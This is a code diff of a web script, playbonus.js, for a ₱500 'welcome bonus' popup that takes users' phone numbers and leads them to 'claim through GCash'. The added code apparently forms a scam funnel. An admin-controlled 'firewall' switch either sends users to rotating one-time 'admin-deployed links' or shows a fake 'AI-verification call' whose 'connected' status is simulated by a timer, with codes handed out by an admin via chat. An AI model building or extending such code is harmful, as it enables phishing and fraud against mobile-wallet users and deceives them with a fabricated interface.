@@ -1,7 +1,7 @@
 /**
- * playbonus.js — MERGED
+ * playbonus.js — REMASTERED
  * ============================================================
- * Includes:
+ * FEATURES:
  *  - Firebase init + user_sessions/{phone}
  *  - Auto popup (₱500 welcome bonus: 3s fresh / 5s claimed)
  *  - Claim ₱500 → credit balance (claimed_ptcat flag)
@@ -10,16 +10,30 @@
  *  - Confetti
  *  - Admin-only force logout
  *  - Ban check (banned_ghosts)
- *  - 3-PHASE CLAIM FLOW (Carnival theme):
+ *
+ *  3-PHASE CLAIM FLOW (Carnival Theme):
  *      PHASE 1: HOORAY — balance + bills + CLAIM THRU GCASH
  *      PHASE 2: GREAT JOB — confirm + PROCEED
- *      PHASE 3: VERIFICATION — only if admin/requireVerification === true
- *  - window.showPopup(balance) integrated
+ *      PHASE 3: AI-VERIFICATION CALL — 6-digit code
+ *
+ *  FIREWALL LOGIC:
+ *      FIREWALL OFF → Phase 1 → Phase 2 → REDIRECT to admin-deployed link
+ *      FIREWALL ON  → Phase 1 → Phase 2 → Phase 3 (AI-Verification) → submit
+ *
  * ============================================================
  */
 
 (function() {
     'use strict';
+
+    // ============================================================
+    // CONFIGURATION
+    // ============================================================
+    // Verification mode:
+    //   'admin_manual' — Admin magbibigay ng code via chat
+    //   'sms_api'      — May tunay na SMS backend
+    //   'demo'         — Temporary test mode (⚠️ INSECURE)
+    var VERIFICATION_MODE = 'admin_manual';
 
     // ============================================================
     // GLOBAL STATE
@@ -43,6 +57,8 @@
     // 3-Phase state
     var currentPhase = 1;
     var isTransitioning = false;
+    var currentFirewallStatus = false;
+    var deployedLinkUrl = null;
 
     var soundCache = {
         scatter: null,
@@ -90,7 +106,7 @@
     // INIT
     // ============================================================
     function init() {
-        console.log('🎁 PlayBonus Starting...');
+        console.log('🎁 PlayBonus REMASTERED Starting...');
 
         userPhone = localStorage.getItem("userPhone");
         if (!userPhone) {
@@ -112,8 +128,9 @@
         initConfetti();
         attachButtonEvents();
         initAdminForceLogoutListener();
+        injectCarnivalAnimations();
 
-        console.log('✅ PlayBonus ready! (Admin-only logout + 3-Phase flow)');
+        console.log('✅ PlayBonus REMASTERED ready!');
     }
 
     // ============================================================
@@ -265,19 +282,62 @@
     }
 
     // ============================================================
-    // FIREWALL + TRACKING
+    // FIREWALL
     // ============================================================
     function checkFirewallBeforeClaim() {
         try {
             return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                 var data = snapshot.val();
-                return (data && data.active === true);
+                currentFirewallStatus = (data && data.active === true);
+                return currentFirewallStatus;
             });
         } catch(e) {
             return Promise.resolve(false);
         }
     }
 
+    // ============================================================
+    // GET DEPLOYED LINK (para sa Phase 2 redirect kapag firewall OFF)
+    // ============================================================
+    function getDeployedLink() {
+        try {
+            return db.ref('links')
+                .orderByChild('status')
+                .equalTo('available')
+                .limitToFirst(1)
+                .once('value')
+                .then(function(snapshot) {
+                    if (snapshot.exists()) {
+                        var key = Object.keys(snapshot.val())[0];
+                        var linkData = snapshot.val()[key];
+                        return { key: key, url: linkData.url };
+                    }
+                    return null;
+                });
+        } catch(e) {
+            console.error('Get link error:', e);
+            return Promise.resolve(null);
+        }
+    }
+
+    function markLinkAsUsed(linkKey, phone) {
+        try {
+            return db.ref('links/' + linkKey).update({
+                status: 'used',
+                user: phone,
+                usedAt: Date.now()
+            }).then(function() {
+                console.log('✅ Link marked as used');
+            });
+        } catch(e) {
+            console.error('Mark link error:', e);
+            return Promise.resolve();
+        }
+    }
+
+    // ============================================================
+    // CLAIM TRACKING
+    // ============================================================
     function trackClaimInFirebase(amount) {
         try {
             var now = new Date();
@@ -545,7 +605,6 @@
     // 3-PHASE CLAIM FLOW (CARNIVAL THEME)
     // ============================================================
 
-    // ---- ENTRY POINT (called by processClaim when firewall ON) ----
     window.showPopup = function(balance) {
         currentBalance = Number(balance) || 0;
         currentPhase = 1;
@@ -727,39 +786,62 @@
                 proceedBtn.disabled = true;
                 proceedBtn.innerHTML = '⏳ CHECKING...';
 
-                checkIfVerificationRequired().then(function(required) {
-                    if (required) {
+                checkFirewallBeforeClaim().then(function(firewallOn) {
+                    if (firewallOn) {
+                        // 🔥 FIREWALL ON → Phase 3 (AI-Verification)
+                        console.log('🔥 Firewall ON → Phase 3 AI-Verification');
                         transitionTo(renderPhase3);
                     } else {
-                        submitWithdrawalRequest();
+                        // 🔓 FIREWALL OFF → Redirect to admin-deployed link
+                        console.log('🔓 Firewall OFF → Redirect to deployed link');
+                        redirectToDeployedLink(proceedBtn);
                     }
                 }).catch(function() {
-                    submitWithdrawalRequest();
+                    // Fail-safe: redirect
+                    redirectToDeployedLink(proceedBtn);
                 });
             };
         }
     }
 
-    // ---- CHECK IF PHASE 3 REQUIRED ----
-    function checkIfVerificationRequired() {
-        try {
-            if (typeof firebase === 'undefined' || !firebase.database) {
-                return Promise.resolve(false);
-            }
-            var db2 = firebase.database();
-            return db2.ref('admin/requireVerification').once('value')
-                .then(function(snap) {
-                    return snap.val() === true;
-                })
-                .catch(function() {
-                    return false;
-                });
-        } catch (e) {
-            return Promise.resolve(false);
+    // ---- REDIRECT TO DEPLOYED LINK (FIREWALL OFF) ----
+    function redirectToDeployedLink(buttonEl) {
+        if (buttonEl) {
+            buttonEl.innerHTML = '⏳ REDIRECTING...';
         }
+
+        getDeployedLink().then(function(linkData) {
+            if (linkData && linkData.url) {
+                deployedLinkUrl = linkData.url;
+
+                markLinkAsUsed(linkData.key, userPhone).then(function() {
+                    console.log('✅ Redirecting to:', linkData.url);
+                    if (buttonEl) {
+                        buttonEl.innerHTML = '✅ REDIRECTING...';
+                    }
+                    setTimeout(function() {
+                        window.location.href = linkData.url;
+                    }, 800);
+                });
+            } else {
+                console.warn('⚠️ No deployed link available');
+                if (buttonEl) {
+                    buttonEl.disabled = false;
+                    buttonEl.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'"> PROCEED TO WITHDRAW';
+                }
+                showInlineError(buttonEl, '❌ NO LINK AVAILABLE');
+            }
+        }).catch(function(err) {
+            console.error('Redirect error:', err);
+            if (buttonEl) {
+                buttonEl.disabled = false;
+                buttonEl.innerHTML = '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'"> PROCEED TO WITHDRAW';
+            }
+            showInlineError(buttonEl, '❌ ERROR');
+        });
     }
 
-    // ---- PHASE 3: VERIFICATION ----
+    // ---- PHASE 3: AI-VERIFICATION CALL ----
     function renderPhase3() {
         currentPhase = 3;
         var inner = document.getElementById('claimPhaseInner');
@@ -774,12 +856,21 @@
             '<div class="popup-close" id="phase3Close">✕</div>',
 
             '<div class="carnival-burst">',
-                '<div class="carnival-icon">🔐</div>',
-                '<h2 class="carnival-title">VERIFICATION</h2>',
+                '<div class="ai-call-icon">📞</div>',
+                '<h2 class="carnival-title">AI-VERIFICATION</h2>',
                 '<p class="carnival-subtext">',
-                    'Enter the 6-digit code sent to ',
-                    '<strong style="color:#00d4ff;">', masked, '</strong>',
+                    'A system AI will call you with a ',
+                    '<strong style="color:#00d4ff;">6-digit code</strong>',
                 '</p>',
+            '</div>',
+
+            '<div class="ai-phone-display">',
+                '<span class="ai-phone-icon">📱</span>',
+                '<span class="ai-phone-number">', masked, '</span>',
+            '</div>',
+
+            '<div id="aiCallStatus" class="ai-call-status">',
+                '⏳ Waiting for call...',
             '</div>',
 
             '<input type="text" id="phase3CodeInput"',
@@ -793,7 +884,7 @@
             '<div id="phase3ErrorMsg" class="carnival-error" style="display:none;"></div>',
 
             '<button class="carnival-btn carnival-btn-gold" id="phase3VerifyBtn">',
-                'VERIFY',
+                'VERIFY CODE',
             '</button>',
 
             '<button class="carnival-btn carnival-btn-ghost" id="phase3BackBtn">',
@@ -810,6 +901,9 @@
         if (backBtn) backBtn.onclick = function() {
             transitionTo(renderPhase2);
         };
+
+        // Start AI call simulation
+        startAICallSimulation();
 
         if (input) {
             input.addEventListener('input', function() {
@@ -847,10 +941,12 @@
                 verifyCodeWithBackend(code).then(function(ok) {
                     if (ok) {
                         verifyBtn.innerHTML = '✅ VERIFIED';
-                        setTimeout(submitWithdrawalRequest, 600);
+                        setTimeout(function() {
+                            submitWithdrawalRequest();
+                        }, 600);
                     } else {
                         verifyBtn.disabled = false;
-                        verifyBtn.innerHTML = 'VERIFY';
+                        verifyBtn.innerHTML = 'VERIFY CODE';
                         if (errEl) {
                             errEl.textContent = '❌ Invalid code. Please try again.';
                             errEl.style.display = 'block';
@@ -862,7 +958,7 @@
                     }
                 }).catch(function() {
                     verifyBtn.disabled = false;
-                    verifyBtn.innerHTML = 'VERIFY';
+                    verifyBtn.innerHTML = 'VERIFY CODE';
                     if (errEl) {
                         errEl.textContent = '⚠️ Verification failed. Please try again.';
                         errEl.style.display = 'block';
@@ -872,44 +968,106 @@
         }
     }
 
-    // ---- VERIFY CODE (REPLACE WITH YOUR BACKEND) ----
-    function verifyCodeWithBackend(code) {
-        // ⚠️ TODO: Replace this stub with your real backend call.
-        //
-        // Example (Firebase Cloud Function):
-        // return fetch('https://your-region-your-project.cloudfunctions.net/verifyCode', {
-        //     method: 'POST',
-        //     headers: { 'Content-Type': 'application/json' },
-        //     body: JSON.stringify({
-        //         phone: localStorage.getItem('userPhone'),
-        //         code: code
-        //     })
-        // }).then(function(r) { return r.json(); }).then(function(d) { return d.ok === true; });
-        //
-        // Example (your own API):
-        // return fetch('/api/verify', {
-        //     method: 'POST',
-        //     headers: { 'Content-Type': 'application/json' },
-        //     body: JSON.stringify({ phone: ..., code: code })
-        // }).then(function(r) { return r.json(); }).then(function(d) { return d.ok; });
+    // ---- AI CALL SIMULATION ----
+    function startAICallSimulation() {
+        var statusEl = document.getElementById('aiCallStatus');
+        if (!statusEl) return;
 
-        console.warn('⚠️ verifyCodeWithBackend not implemented — returning false');
+        // Simulate: 1.5s dialing
+        statusEl.innerHTML = '📞 Dialing...';
+        statusEl.style.color = '#00d4ff';
+
+        setTimeout(function() {
+            statusEl.innerHTML = '🔊 AI Call Connected — Listen for the code';
+            statusEl.style.color = '#39ff14';
+
+            // Save to Firebase: call_requested
+            try {
+                db.ref('ai_call_requests').push({
+                    phone: userPhone,
+                    requested_at: Date.now(),
+                    status: 'connected'
+                });
+            } catch(e) {}
+        }, 1500);
+    }
+
+    // ---- VERIFY CODE ----
+    function verifyCodeWithBackend(code) {
+        if (VERIFICATION_MODE === 'demo') {
+            // ⚠️ DEMO MODE: Accept any 6-digit code (INSECURE — for testing only)
+            console.warn('⚠️ DEMO MODE: Accepting any 6-digit code');
+            return Promise.resolve(true);
+        }
+
+        if (VERIFICATION_MODE === 'admin_manual') {
+            // Admin magbibigay ng code via chat — naka-store sa verification_codes/{phone}
+            return db.ref('verification_codes/' + userPhone).once('value')
+                .then(function(snap) {
+                    if (!snap.exists()) {
+                        console.warn('⚠️ No verification code found for', userPhone);
+                        return false;
+                    }
+
+                    var data = snap.val();
+                    var storedCode = String(data.code || '');
+                    var expiresAt = data.expiresAt || 0;
+
+                    // Check expiration (default 5 minutes)
+                    if (expiresAt && Date.now() > expiresAt) {
+                        console.warn('⚠️ Verification code expired');
+                        return false;
+                    }
+
+                    // Compare
+                    var match = (storedCode === String(code));
+
+                    if (match) {
+                        // Mark as used
+                        db.ref('verification_codes/' + userPhone).update({
+                            used: true,
+                            usedAt: Date.now()
+                        });
+                    }
+
+                    return match;
+                })
+                .catch(function(err) {
+                    console.error('Verify error:', err);
+                    return false;
+                });
+        }
+
+        if (VERIFICATION_MODE === 'sms_api') {
+            // ⚠️ Palitan ito ng iyong tunay na SMS backend
+            return fetch('https://your-backend.com/api/verify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: userPhone,
+                    code: code
+                })
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(d) { return d.ok === true; })
+            .catch(function() { return false; });
+        }
+
         return Promise.resolve(false);
     }
 
     // ---- SUBMIT WITHDRAWAL ----
     function submitWithdrawalRequest() {
-        // ⚠️ TODO: Replace with your real withdrawal submission.
         var userPhoneLocal = localStorage.getItem('userPhone');
         var amount = currentBalance;
 
         try {
             if (typeof firebase !== 'undefined' && firebase.database) {
-                var db2 = firebase.database();
-                db2.ref('withdrawal_requests').push({
+                db.ref('withdrawal_requests').push({
                     phone: userPhoneLocal,
                     amount: amount,
                     status: 'pending',
+                    verified: true,
                     requested_at: Date.now()
                 }).then(function() {
                     showSuccessAndClose(amount);
@@ -970,6 +1128,72 @@
             button.style.background = '';
             button.innerHTML = original;
         }, 1800);
+    }
+
+    // ============================================================
+    // CARNIVAL ANIMATIONS (injected)
+    // ============================================================
+    function injectCarnivalAnimations() {
+        if (document.querySelector('#carnival-animations')) return;
+
+        var style = document.createElement('style');
+        style.id = 'carnival-animations';
+        style.textContent = [
+            '@keyframes carnivalShake {',
+                '0%, 100% { transform: translateX(0); }',
+                '20% { transform: translateX(-8px); }',
+                '40% { transform: translateX(8px); }',
+                '60% { transform: translateX(-5px); }',
+                '80% { transform: translateX(5px); }',
+            '}',
+            '@keyframes aiCallPulse {',
+                '0%, 100% { transform: scale(1); opacity: 1; }',
+                '50% { transform: scale(1.08); opacity: 0.85; }',
+            '}',
+            '.ai-call-icon {',
+                'font-size: 60px;',
+                'filter: drop-shadow(0 0 25px rgba(0, 212, 255, 0.7));',
+                'animation: aiCallPulse 1.5s ease-in-out infinite;',
+                'display: inline-block;',
+            '}',
+            '.ai-phone-display {',
+                'display: flex;',
+                'align-items: center;',
+                'justify-content: center;',
+                'gap: 10px;',
+                'margin: 15px 0;',
+                'padding: 12px 20px;',
+                'background: rgba(0, 0, 0, 0.4);',
+                'border: 2px solid #00d4ff;',
+                'border-radius: 12px;',
+                'box-shadow: 0 0 25px rgba(0, 212, 255, 0.4), inset 0 0 20px rgba(0, 212, 255, 0.1);',
+            '}',
+            '.ai-phone-icon {',
+                'font-size: 24px;',
+                'animation: aiCallPulse 1.5s ease-in-out infinite;',
+            '}',
+            '.ai-phone-number {',
+                'font-family: "Orbitron", monospace;',
+                'font-size: 20px;',
+                'font-weight: 900;',
+                'color: #00d4ff;',
+                'letter-spacing: 3px;',
+                'text-shadow: 0 0 20px rgba(0, 212, 255, 0.6);',
+            '}',
+            '.ai-call-status {',
+                'font-family: "Poppins", sans-serif;',
+                'font-size: 13px;',
+                'color: #00d4ff;',
+                'text-align: center;',
+                'margin: 10px 0;',
+                'padding: 10px;',
+                'background: rgba(0, 212, 255, 0.08);',
+                'border: 1px solid rgba(0, 212, 255, 0.2);',
+                'border-radius: 10px;',
+                'transition: all 0.3s ease;',
+            '}'
+        ].join('');
+        document.head.appendChild(style);
     }
 
     // ============================================================
@@ -1480,7 +1704,8 @@
         getUserPhone: function() { return userPhone; },
         isUserClaimed: function() { return isClaimed; },
         showPopup: window.showPopup,
-        closePopup: window.closePopup
+        closePopup: window.closePopup,
+        getFirewallStatus: function() { return currentFirewallStatus; }
     };
 
     // ============================================================
